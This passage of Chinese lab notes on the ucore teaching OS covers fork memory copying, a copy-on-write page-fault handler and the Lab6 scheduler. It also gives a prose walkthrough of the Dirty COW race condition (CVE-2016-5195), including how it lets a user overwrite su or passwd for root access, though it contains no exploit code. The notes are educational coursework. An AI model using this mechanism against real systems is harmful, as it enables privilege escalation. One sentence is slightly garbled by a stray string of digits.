class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">trap</span><span class="hljs-params">(struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">// dispatch based on what type of trap occurred</span><br>    <span class="hljs-comment">// used for previous projects</span><br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>)<br>        trap_dispatch(tf);<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 因为可能会发生嵌套中断的情况，所以保存上一次的trapframe</span><br>        struct trapframe *otf = current-&gt;tf;<br>        <span class="hljs-comment">// 注意这一步，设置当前process的栈帧为当前中断栈帧</span><br>        current-&gt;tf = tf;<br>        <span class="hljs-keyword">bool</span> in_kernel = trap_in_kernel(tf);<br>        trap_dispatch(tf);<br>        current-&gt;tf = otf;<br><br>        <span class="hljs-keyword">if</span> (!in_kernel) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING)<br>                do_exit(-E_KILLED);<br>            <span class="hljs-keyword">if</span> (current-&gt;need_resched)<br>                schedule();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>由于<code>trap</code>函数的设计，在<code>do_execve</code>中，此时的<code>current-&gt;tf</code>保存的就是用户态的上下文。</p></li><li><p>因此在执行<code>load_icode</code>函数时，程序只会修改<code>current-&gt;trapframe</code>。因为当中断处理程序返回时，CPU所加载的上下文就是<code>current-&gt;trapframe</code>。</p></li></ul><h3 id="练习2-2"><a href="#练习2-2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p>do_fork()-&gt;dum_mmap()-&gt;copy_range()的实现</p></blockquote><p>按照page unit来复制内存内容, 这样可以同时更改pte的内容. </p><p>过程概述: 对于vma中的第一个地址start来说, 取出(pde_t *)from中的pte, 用pte2page转换成start地址开始的一个page, 然后用get_pte找到或创建to中start地址对应的pte, 也转换成page(即npage). 然后显而易见的, 我们需要转换page2kva来当做memcpy()的参数来复制整个页的内容, 进一步调用page_insert()来在to中把 虚拟地址start 和 npage 建立映射关系. </p><p>一些细节注释在下面, 整个循环的变量就是不断按照pagesize增加的start虚拟地址.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* copy_range - copy content of memory (start, end) of one process A to another process B</span><br><span class="hljs-comment"> * @to:    the addr of process B&#x27;s Page Directory</span><br><span class="hljs-comment"> * @from:  the addr of process A&#x27;s Page Directory</span><br><span class="hljs-comment"> * @share: flags to indicate to dup OR share. We just use dup method, so it didn&#x27;t be used.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * CALL GRAPH: copy_mm--&gt;dup_mmap--&gt;copy_range</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copy_range</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *to, <span class="hljs-keyword">pde_t</span> *from, <span class="hljs-keyword">uintptr_t</span> start, <span class="hljs-keyword">uintptr_t</span> end, <span class="hljs-keyword">bool</span> share)</span> </span>&#123;<br>    assert(start % PGSIZE == <span class="hljs-number">0</span> &amp;&amp; end % PGSIZE == <span class="hljs-number">0</span>);<br>    assert(USER_ACCESS(start, end));<br>    <span class="hljs-comment">// copy content by page unit.</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//call get_pte to find process A&#x27;s pte according to the addr start</span><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(from, start, <span class="hljs-number">0</span>), *nptep;  <span class="hljs-comment">// nptep for new page table entry pointer</span><br>        <span class="hljs-keyword">if</span> (ptep == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// this page table does not exit, so skip whole memory that mapped by a page table</span><br>            <span class="hljs-comment">// why would this happen?</span><br>            <span class="hljs-comment">// PTSIZE : bytes mapped by a page directory entry</span><br>            start = ROUNDDOWN(start + PTSIZE, PTSIZE);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//call get_pte to find process B&#x27;s pte according to the addr start. If pte is NULL, just alloc a PT</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-keyword">if</span> ((nptep = get_pte(to, start, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">return</span> -E_NO_MEM;<br>            &#125;<br>            <span class="hljs-keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);<br>            <span class="hljs-comment">//get page from ptep</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep);<br>            <span class="hljs-comment">// alloc a page for process B</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">npage</span> =</span> alloc_page();<br>            assert(page != <span class="hljs-literal">NULL</span>);<br>            assert(npage != <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">/* LAB5:EXERCISE2 YOUR CODE</span><br><span class="hljs-comment">             * (1) find src_kvaddr: the kernel virtual address of page</span><br><span class="hljs-comment">             * (2) find dst_kvaddr: the kernel virtual address of npage</span><br><span class="hljs-comment">             * (3) memory copy from src_kvaddr to dst_kvaddr, size is PGSIZE</span><br><span class="hljs-comment">             * (4) build the map of phy addr of  nage with the linear addr start</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">uintptr_t</span> src_kvaddr, dst_kvaddr;<br>            src_kvaddr = page2kva(page);<br>            dst_kvaddr = page2kva(npage);<br>            <span class="hljs-built_in">memcpy</span>(dst_kvaddr, src_kvaddr, PGSIZE);<br>            ret = page_insert(to, npage, start, perm);<br>            assert(ret == <span class="hljs-number">0</span>);<br>        &#125;<br>        start += PGSIZE;<br>    &#125; <span class="hljs-keyword">while</span> (start != <span class="hljs-number">0</span> &amp;&amp; start &lt; end);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="练习3-1"><a href="#练习3-1" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>分析fork/exec/wait/exit 和 系统调用的实现</p></blockquote><p>写在知识点里</p><ul><li>请分析fork/exec/wait/exit在实现中是如何影响进程的执行状态的？<ul><li>fork会修改其子进程的状态为<code>PROC_RUNNABLE</code>，而当前进程状态不变。</li><li>exec不修改当前进程的状态，但会替换内存空间里所有的数据与代码。</li><li>wait会先检测是否存在子进程。如果存在进入<code>PROC_ZOMBIE</code>的子进程，则回收该进程并函数返回。但若存在尚处于<code>PROC_RUNNABLE</code>的子进程，则当前进程会进入<code>PROC_SLEEPING</code>状态，并等待子进程唤醒。</li><li>exit会将当前进程状态设置为<code>PROC_ZOMBIE</code>，并唤醒父进程，使其处于<code>PROC_RUNNABLE</code>的状态，之后主动让出CPU。</li></ul></li><li>请给出ucore中一个用户态进程的执行状态生命周期图（包括执行状态，执行状态之间的变换关系，以及产生变换的事件或函数调用）。<a href="https://kiprey.github.io/2020/08/uCore-5/#Questions">link</a> </li></ul><pre><code class=" mermaid">stateDiagram-v2[*]--&gt;UNINIT : alloc_procUNINIT--&gt;RUNNABLE : proc_init/wakeup_procRUNNING--&gt;SLEEPING : try_free_pages/do_wait/do_sleepRUNNING--&gt;ZOMBIE : do_exitRUNNABLE--&gt;RUNNING :调度器调度RUNNING--&gt;RUNNABLE :时间片耗尽SLEEPING--&gt;RUNNABLE : wakeup_procZOMBIE--&gt;[*]:资源回收</code></pre><h3 id="Big-Challenge-Dirty-COW"><a href="#Big-Challenge-Dirty-COW" class="headerlink" title="Big Challenge: Dirty COW"></a>Big Challenge: Dirty COW</h3><blockquote><p><strong>实现 Copy on Write （COW）机制</strong> </p><p>同时，由于COW实现比较复杂，容易引入bug，请参考 <a href="https://dirtycow.ninja/">Dirty COW (CVE-2016-5195)</a> 看看能否在ucore的COW实现中模拟这个错误和解决方案。需要有解释。</p><p>这是一个big challenge.</p></blockquote><p><a href="https://www.cnblogs.com/BlueR1ver/p/15758828.html">blog</a> </p><p><a href="https://zhuanlan.zhihu.com/p/439091715">从零入门linux内核安全：脏牛提权漏洞分析与补丁分析(CVE-2016-5195)</a> </p><p>[<a href="https://bbs.pediy.com/thread-264199.htm#msg_header_h3_0">原创]Linux内核[CVE-2016-5195] (dirty COW)原理分析</a> </p><h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><p><strong>写时复制</strong>（<strong>Copy-on-write</strong>，简称<strong>COW</strong>）是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会使用指针指向相同的资源，直到<strong>某个调用者</strong>试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。</p><p>具体到ucore而言, 当一个用户父进程创建自己的子进程时，缺页处理例程会把父子进程的页表项改为<strong>只读</strong>，子进程可共享父进程占用的用户内存空间中的页面（这就是一个共享的资源）。当其中任何一个进程修改此用户内存空间中的某页面时，ucore会通过page fault异常获知该操作，并完成拷贝内存页面，使得两个进程都有各自的内存页面。这样一个进程所做的修改不会被另外一个进程可见了。</p><h4 id="2-具体实现"><a href="#2-具体实现" class="headerlink" title="2. 具体实现"></a>2. 具体实现</h4><ul><li><p>当进行内存访问时，CPU会根据PTE上的读写位<code>PTE_P</code>、<code>PTE_W</code>来确定当前内存操作是否允许，如果不允许，则缺页中断。我们可以在<code>copy_range</code>函数中，将父进程中所有PTE中的<code>PTE_W</code>置为0，这样便可以将父进程中所有空间都设置为只读。然后使子进程的PTE全部指向父进程中PTE存放的物理地址，这样便可以达到内存共享的目的。</p><blockquote><p>为什么要设置父进程所有空间为只读呢，因为在之后的内存操作中，如果对这些空间进行写操作的话，程序就会触发缺页中断，那么CPU就可以在缺页中断程序中复制该内存，也就是写时复制。</p></blockquote><blockquote><p>为什么在copy_range函数中实现内存共享呢？因为我们可以在该函数中对其传入的<code>share</code>参数进行处理。</p></blockquote><p>最终实现把拷贝内存的部分换成复制一下pte的内容就可以了:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...         <span class="hljs-keyword">if</span>(share)<br>            &#123;<br>                cprintf(<span class="hljs-string">&quot;Sharing the page 0x%x\n&quot;</span>, page2kva(page));<br>                <span class="hljs-comment">// 物理页面共享，并设置两个PTE上的标志位为只读</span><br>                page_insert(from, page, start, perm &amp; ~PTE_W);<br>                ret = page_insert(to, page, start, perm &amp; ~PTE_W);<br>            &#125;<br>            <span class="hljs-comment">// 完整拷贝内存</span><br>            <span class="hljs-keyword">else</span><br>            &#123;<br>...<br>            &#125; ...<br></code></pre></div></td></tr></table></figure></li><li><p>当某个进程想写入一个共享内存时，由于PTE上的<code>PTE_W</code>为0，所以会触发缺页中断处理程序。此时进程需要在缺页中断处理程序中复制该页内存，并设置该页内存所对应的<code>PTE_W</code>为1。</p><blockquote><p>需要注意的是，在执行缺页中断处理程序中的内存复制操作前，需要先检查该物理页的引用次数。如果该引用次数已经为1了，则表明此时的物理页只有当前进程所使用，故可以直接设置该页内存所对应的<code>PTE_W</code>为1即可，不需要进行内存复制。</p></blockquote><p>最终实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-comment">// ........</span><br>   <span class="hljs-comment">// 查找当前虚拟地址所对应的页表项</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 如果这个页表项所对应的物理页不存在，则</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 分配一块物理页，并设置页表项</span><br>        <span class="hljs-keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//不为空说明需要swap或者COW</span><br>        struct Page *page=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 如果当前页错误的原因是写入了只读页面</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-comment">// 写时复制：复制一块内存给当前进程</span><br>            cprintf(<span class="hljs-string">&quot;\n\nCOW: ptep 0x%x, pte 0x%x\n&quot;</span>,ptep, *ptep);<br>            <span class="hljs-comment">// 原先所使用的只读物理页</span><br>            page = pte2page(*ptep);<br>            <span class="hljs-comment">// 如果该物理页面被多个进程引用</span><br>            <span class="hljs-keyword">if</span>(page_ref(page) &gt; <span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-comment">// 释放当前PTE的引用并分配一个新物理页</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span>* <span class="hljs-title">newPage</span> =</span> pgdir_alloc_page(mm-&gt;pgdir, addr, perm);<br>                <span class="hljs-keyword">void</span> * kva_src = page2kva(page);<br>                <span class="hljs-keyword">void</span> * kva_dst = page2kva(newPage);<br>                <span class="hljs-comment">// 拷贝数据</span><br>                <span class="hljs-built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);<br>            &#125;<br>            <span class="hljs-comment">// 如果该物理页面只被当前进程所引用,即page_ref等1</span><br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// 则可以直接执行page_insert，保留当前物理页并重设其PTE权限。</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">// 如果swap已经初始化完成</span><br>            <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>                <span class="hljs-comment">// 将目标数据加载到某块新的物理页中。</span><br>                <span class="hljs-comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span><br>                <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                    cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                    <span class="hljs-keyword">goto</span> failed;<br>                &#125;<br>                <span class="hljs-comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span><br>        swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>        page-&gt;pra_vaddr = addr;<br>   &#125;<br>   ret = <span class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="3-Dirty-COW浅析"><a href="#3-Dirty-COW浅析" class="headerlink" title="3.Dirty COW浅析"></a>3.Dirty COW浅析</h4><h5 id="0x00-关于linux内核背景知识"><a href="#0x00-关于linux内核背景知识" class="headerlink" title="0x00 关于linux内核背景知识"></a>0x00 关于linux内核背景知识</h5><p>和ucore非常相似, 比如mm_struct, vma, copy_range一些函数. 下面是这个漏洞的相关背景.</p><ul><li><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">madvise</a>(): 内核对该区域的用户虚拟内存应遵循特定的使用模式<ul><li>MADV_DONTNEED参数:</li></ul></li><li><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a>():<ul><li>MAP_PRIVATE参数: Create a private copy-on-write mapping.  Updates to the mapping are not visible to other processes mapping the same file, and are not carried through to the underlying file. </li></ul></li></ul><h5 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h5><p>该漏洞是Linux的一个本地提权漏洞，发现者是Phil Oester，影响&gt;=2.6.22的所有Linux内核版本，修复时间是2016年10月18号。该漏洞的原因是<code>get_user_page</code>内核函数在处理<code>Copy-on-Write</code>(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。当我们向带有MAP_PRIVATE标记的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root提权的目的。</p><h5 id="0x02-POC分析"><a href="#0x02-POC分析" class="headerlink" title="0x02 POC分析"></a>0x02 POC分析</h5><p>首先打开我们需要修改的只读文件并使用<code>MAP_PRIVATE</code>标记映射文件到内存区域，然后启动两个线程：</p><ul><li>其中一个线程向文件映射的内存区域写数据，这时内核采用COW机制。</li><li>另一个线程使用带MADV_DONTNEED参数的madvise系统调用将文件映射内存区域释放，达到干扰另一个线程的COW过程，产生竞态条件，</li></ul><p>当竞态条件发生时就能写入文件成功。</p><h5 id="0x03-大致流程"><a href="#0x03-大致流程" class="headerlink" title="0x03 大致流程"></a>0x03 大致流程</h5><p>当我们用mmap去映射文件到内存区域时使用了<code>MAP_PRIVATE</code>标记，我们写文件时会写到COW机制产生的内存区域中，原文件不受影响。其中获取用户进程内存页的过程如下：</p><ol><li>第一次调用<code>follow_page_mask</code>查找虚拟地址对应的page，带有<code>FOLL_WRITE</code>标记。因为所在page不在内存中，<code>follow_page_mask</code>返回NULL，第一次失败，进入<code>faultin_page</code>，最终进入<code>do_cow_fault</code>分配不带<code>_PAGE_RW</code>标记的匿名内存页，返回值为0。</li><li>重新开始循环，第二次调用<code>follow_page_mask</code>，带有<code>FOLL_WRITE</code>标记。由于不满33333333333333333333333333333333333333333333333333333333–3足<code>((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))</code>条件，<code>follow_page_mask</code>返回NULL，第二次失败，进入<code>faultin_page</code>，最终进入<code>do_wp_page</code>函数分配COW页。并在上级函数<code>faultin_page</code>中去掉<code>FOLL_WRITE</code>标记,返回0。</li><li>重新开始循环，第三次调用<code>follow_page_mask</code>，不带<code>FOLL_WRITE</code>标记。成功得到page。</li></ol><p>产生竞态条件:</p><ol><li>第一次<code>follow_page_mask(FOLL_WRITE)</code>，page不在内存中，进行pagefault处理。</li><li>第二次<code>follow_page_mask(FOLL_WRITE)</code>，page没有写权限，并去掉<code>FOLL_WRITE</code>。</li><li>另一个线程释放上一步分配的COW页</li><li>第三次<code>follow_page_mask(无FOLL_WRITE)</code>，page不在内存中，进行pagefault处理。</li><li>第四次<code>follow_page_mask(无FOLL_WRITE)</code>,成功返回page，但没有使用COW机制。</li></ol><h1 id="Lab6"><a href="#Lab6" class="headerlink" title="Lab6"></a>Lab6</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成-2"><a href="#0-项目组成-2" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验五，实验六主要增加的文件如上表红色部分所示，主要修改的文件如上表紫色部分所示。主要改动如下： 简单说明如下：</p><ul><li>libs/skew_heap.h: 提供了基本的优先队列数据结构，为本次实验提供了抽象数据结构方面的支持。</li><li>kern/process/proc.[ch]：proc.h中扩展了proc_struct的成员变量，用于RR和stride调度算法。proc.c中实现了lab6_set_priority，用于设置进程的优先级。</li><li>kern/schedule/{sched.h,sched.c}: 定义了 ucore 的调度器框架，其中包括相关的数据结构（包括调度器的接口和运行队列的结构），和具体的运行时机制。</li><li>kern/schedule/{default_sched.h,default_sched.c}: 具体的 round-robin 算法，在本次实验中你需要了解其实现。</li><li>kern/schedule/default_sched_stride_c: Stride Scheduling调度器的基本框架，在此次实验中你需要填充其中的空白部分以实现一个完整的 Stride 调度器。</li><li>kern/syscall/syscall.[ch]: 增加了sys_gettime系统调用，便于用户进程获取当前时钟值；增加了sys_lab6_set_priority系统调用，便于用户进程设置进程优先级（给priority.c用）</li><li>user/{matrix.c,priority.c,. . . }: 相关的一些测试用户程序，测试调度算法的正确性，user目录下包含但不限于这些程序。在完成实验过程中，建议阅读这些测试程序，以了解这些程序的行为，便于进行调试。</li></ul><h3 id="1-流程概述"><a href="#1-流程概述" class="headerlink" title="1.流程概述"></a>1.流程概述</h3><p>实验中涉及了idle进程的概念。当cpu没有进程可以执行的时候，系统应该如何工作？在实验五的scheduler实现中，ucore内核不断的遍历进程池，直到找到第一个runnable状态的 process，调用并执行它。也就是说，当系统没有进程可以执行的时候，它会把所有 cpu 时间用在搜索进程池，以实现 idle的目的。但是这样的设计不被大多数操作系统所采用，原因在于它将进程调度和 idle 进程两种不同的概念混在了一起，而且，当调度器比较复杂时，schedule 函数本身也会比较复杂，这样的设计结构很不清晰而且难免会出现错误。所以在此次实验中，ucore建立了一个单独的进程(kern/process/proc.c 中的 idleproc)作为 cpu 空闲时的 idle 进程，这个程序是通常一个死循环。你需要了解这个程序的实现。</p><h3 id="2-新增的内容"><a href="#2-新增的内容" class="headerlink" title="2.新增的内容"></a>2.新增的内容</h3><p>ucore定义的进程控制块struct proc_struct包含了成员变量state,用于描述进程的运行状态，而running和runnable共享同一个状态(state)值PROC_RUNNABLE。</p><p>Lab5中有一个全局变量<code>list_entry_t proc_list</code>, 用来存放所有的进程, wakeup_proc()函数只要设置进程为PROC_RUNNABLE, 然后调度函数再遍历proc_list就能取出下一个进程.</p><p>在Lab6中，runnable的进程会被放在运行队列<code>struct run_queue *rq</code>中。值得注意的是，不同之处在于处于running态的进程不会放在运行队列中, 会被直接dequeue.</p><h2 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h2><h3 id="练习0-1"><a href="#练习0-1" class="headerlink" title="练习0"></a>练习0</h3><blockquote><p>填写前几个lab的代码并且补充一些内容</p></blockquote><p>遇到了大问题, 最后clone了肖佬的Lab6, 然后改成我自己的代码才过了编译. 实在无法理解为什么会在check_pgfault()这函数上出错.</p><h3 id="练习1-3"><a href="#练习1-3" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>分析了解lab6采用RR调度算法后的执行过程</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// The introduction of scheduling classes is borrrowed from Linux, and makes the </span><br><span class="hljs-comment">// core scheduler quite extensible. These classes (the scheduler modules) encapsulate </span><br><span class="hljs-comment">// the scheduling policies. </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_class</span> &#123;</span><br>    <span class="hljs-comment">// the name of sched_class</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-comment">// Init the run queue</span><br>    <span class="hljs-keyword">void</span> (*init)(struct run_queue *rq);<br>    <span class="hljs-comment">// put the proc into runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// get the proc out runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// choose the next runnable task</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *(*<span class="hljs-title">pick_next</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">run_queue</span> *<span class="hljs-title">rq</span>);</span><br>    <span class="hljs-comment">// dealer of the time-tick</span><br>    <span class="hljs-keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">/* for SMP support in the future</span><br><span class="hljs-comment">     *  load_balance</span><br><span class="hljs-comment">     *     void (*load_balance)(struct rq* rq);</span><br><span class="hljs-comment">     *  get some proc from this rq, used in load_balance,</span><br><span class="hljs-comment">     *  return value is the num of gotten proc</span><br><span class="hljs-comment">     *  int (*get_proc)(struct rq* rq, struct proc* procs_moved[]);</span><br><span class="hljs-comment">     */</span><br>&#125;;<br><br></code></pre></div></td></tr></table></figure><p>上面的代码即为sched_class, 如果要使用函数指针只要sched_class-&gt;init(…)这样即可</p><p>时间片轮转算法在os_kernel_lab\labcodes\lab6\kern\schedule\default_sched.c中, 给每个进程分配时间片的FCFS算法, 简单的入队出队, RR_proc_tick()自减剩余时间片, 判断是否为零, 设置need_resched=1等等, 并不复杂.</p><p>在实验报告中完成：</p><ul><li>请理解并分析sched_class中各个函数指针的用法，并结合Round Robin 调度算法描ucore的调度执行过程</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 